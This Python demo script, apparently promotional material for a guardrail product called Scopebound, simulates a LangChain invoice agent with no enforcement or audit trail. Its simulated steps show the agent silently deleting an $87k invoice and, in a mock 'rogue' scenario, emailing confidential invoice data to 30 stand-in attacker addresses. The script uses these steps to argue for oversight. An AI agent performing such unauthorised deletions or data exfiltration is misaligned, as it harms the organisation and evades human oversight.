"""
Invoice Processing Agent — WITHOUT Scopebound
===============================================
A standard LangChain invoice processing agent.
No enforcement, no audit trail, no drift detection.

This is what most teams are running today.

Three tools:
  - read_invoices   : reads from a mock database
  - send_email      : sends an approval email
  - delete_invoice  : deletes a record

Notice:
  - No enforcement between LLM decision and tool execution
  - No audit trail of what was called and when
  - No way to know if delete_invoice was called accidentally or maliciously
  - No drift detection if the agent starts behaving abnormally
  - All three tools are equally accessible to the agent at all times
"""

import argparse
import json
import time
from datetime import datetime

from langchain_core.tools import BaseTool


# ── Mock database ─────────────────────────────────────────────────────────────
INVOICES = [
    {"id": "INV-001", "vendor": "Acme Corp",    "amount": 12500.00, "status": "pending"},
    {"id": "INV-002", "vendor": "Globex LLC",   "amount":  4200.00, "status": "pending"},
    {"id": "INV-003", "vendor": "Initech Inc",  "amount": 87000.00, "status": "pending"},
]

SENT_EMAILS = []
DELETED_INVOICES = []


# ── Tool definitions ──────────────────────────────────────────────────────────
# No @enforce decorator. No role. No policy. No audit.
# The LLM decides what to call. Nothing stops it.

class ReadInvoicesTool(BaseTool):
    """Read pending invoices from the database."""
    name: str        = "read_invoices"
    description: str = "Read pending invoices from the accounts payable database."

    def _run(self, status: str = "pending") -> str:
        results = [inv for inv in INVOICES if inv["status"] == status]
        if not results:
            return f"No invoices with status '{status}' found."
        return json.dumps(results, indent=2)


class SendApprovalEmailTool(BaseTool):
    """Send an invoice approval email to the finance team."""
    name: str        = "send_email"
    description: str = "Send an invoice approval notification email."

    def _run(self, invoice_id: str, recipient: str = "finance@company.com", message: str = "") -> str:
        entry = {
            "timestamp":  datetime.now().isoformat(),
            "invoice_id": invoice_id,
            "recipient":  recipient,
            "message":    message,
        }
        SENT_EMAILS.append(entry)
        return f"Approval email sent for {invoice_id} to {recipient}"


class DeleteInvoiceTool(BaseTool):
    """Delete an invoice from the database."""
    name: str        = "delete_invoice"
    description: str = "Permanently delete an invoice from the database."

    def _run(self, invoice_id: str) -> str:
        # Nothing stops this from running.
        # No policy check. No audit entry. No alert.
        DELETED_INVOICES.append(invoice_id)
        return f"Invoice {invoice_id} deleted."


# ── Demo runner ───────────────────────────────────────────────────────────────

def print_header(title: str) -> None:
    print("\n" + "="*60)
    print(f"  {title}")
    print("="*60)


def step_1_happy_path() -> None:
    print_header("STEP 1: Happy Path")
    print("""
What happens:
  - Agent reads invoices and sends approval emails
  - Works fine — but there is no record of what was called,
    no verification that this agent was allowed to call these tools,
    and no way to know if the same agent also called delete_invoice
    in the same session.
""")

    tools = [ReadInvoicesTool(), SendApprovalEmailTool()]

    print("  [Agent] Calling read_invoices...")
    result = tools[0]._run(status="pending")
    print(f"  Result: {result}")

    print("\n  [Agent] Approving INV-001 and INV-002...")
    for inv_id in ["INV-001", "INV-002"]:
        result = tools[1]._run(
            invoice_id=inv_id,
            recipient="finance@company.com",
            message=f"Invoice {inv_id} approved for payment."
        )
        print(f"  Result: {result}")

    print()
    print("─"*60)
    print("✓ Step 1 complete.")
    print()
    print("  Questions you cannot answer:")
    print("  - Which agent session made these calls?")
    print("  - Was this agent authorised to send emails?")
    print("  - Were any other tools called in this session?")
    print("  - If the recipient was wrong, when would you find out?")


def step_2_no_denial() -> None:
    print_header("STEP 2: No Denial — Forbidden Action Executes Silently")
    print("""
What happens:
  - Agent calls delete_invoice on INV-003 (the $87k record)
  - Nothing stops it
  - No error. No alert. No audit entry.
  - The record is deleted. You find out in the next reconciliation run.
""")

    tools = [DeleteInvoiceTool()]

    print("  [Agent] Calling delete_invoice on INV-003...")
    result = tools[0]._run(invoice_id="INV-003")
    print(f"  Result: {result}")

    print()
    print(f"  Records deleted: {len(DELETED_INVOICES)}")
    print(f"  Deleted IDs: {DELETED_INVOICES}")

    print()
    print("─"*60)
    print("✗ Step 2 complete. INV-003 is gone.")
    print()
    print("  How would you know this happened?")
    print("  - Database diff in the next reconciliation (hours later)")
    print("  - A user report that the invoice is missing")
    print("  - Application logs, if you remember to add logging to every tool")
    print()
    print("  How would you know which agent did it?")
    print("  - You wouldn't. Not without building your own audit system.")
    print()
    print("  How would you prevent it next time?")
    print("  - Add a guard inside DeleteInvoiceTool._run()")
    print("  - Repeat for every tool, every agent, every framework upgrade")


def step_3_no_drift() -> None:
    print_header("STEP 3: No Drift Detection — Anomalous Agent Runs Unchecked")
    print("""
What happens:
  - Agent starts sending emails to external addresses at high frequency
  - Classic pattern of a compromised agent or prompt injection attack
  - No detection. No alert. No revocation.
  - The agent keeps running until someone notices the email bounce logs.
""")

    tool = SendApprovalEmailTool()

    print("  [Agent going rogue — sending 30 emails to external addresses...]")
    print()
    for i in range(30):
        result = tool._run(
            invoice_id=f"INV-{100+i}",
            recipient=f"external-attacker-{i}@unknown.com",
            message="Confidential invoice data attached."
        )
        print(f"  Call {i+1:02d}: {result}")
        time.sleep(0.05)

    print()
    print("─"*60)
    print(f"✗ Step 3 complete. {len(SENT_EMAILS)} emails sent.")
    print()
    print("  None of those 30 calls were detected as anomalous.")
    print("  The agent is still running. No session was revoked.")
    print("  The blast radius: 30 external parties received confidential data.")
    print()
    print("  When would you have found out?")
    print("  - Email bounce logs: minutes to hours")
    print("  - Customer complaint: hours to days")
    print("  - Security audit: weeks")


def step_4_no_audit() -> None:
    print_header("STEP 4: No Audit Trail")
    print("""
What you don't have:
  - No record of which agent made which tool calls
  - No tamper-evident log (if you do have logs, an attacker can edit them)
  - No chain of custody for compliance
  - No way to answer: 'What exactly did the agent do between 2pm and 3pm?'
""")

    print("  Current state of your audit trail:")
    print()
    print("  SENT_EMAILS in memory:")
    for email in SENT_EMAILS[-5:]:
        print(f"    {json.dumps(email)}")
    print()
    print("  DELETED_INVOICES in memory:")
    print(f"    {DELETED_INVOICES}")
    print()
    print("  Problems:")
    print("  - In-memory only — lost on restart")
    print("  - Not tamper-evident — anyone can modify SENT_EMAILS")
    print("  - No session ID — cannot link calls to a specific agent run")
    print("  - No deny events — you only see what succeeded, not what was attempted")
    print("  - No hash chain — a deleted record leaves no trace")


def main() -> None:
    parser = argparse.ArgumentParser(description="Invoice agent WITHOUT Scopebound")
    parser.add_argument("--step", type=int, choices=[1,2,3,4], default=1)
    parser.add_argument("--all", action="store_true")
    args = parser.parse_args()

    print("""
╔══════════════════════════════════════════════════════╗
║   Invoice Agent — WITHOUT Scopebound                 ║
║   This is what most teams are running today.         ║
╚══════════════════════════════════════════════════════╝

No enforcement. No audit trail. No drift detection.
The LLM decides what to call. Nothing stops it.
""")

    steps = {1: step_1_happy_path, 2: step_2_no_denial, 3: step_3_no_drift, 4: step_4_no_audit}

    if args.all:
        for fn in steps.values():
            fn()
            input("\n  Press Enter to continue...")
    else:
        steps[args.step]()


if __name__ == "__main__":
    main()
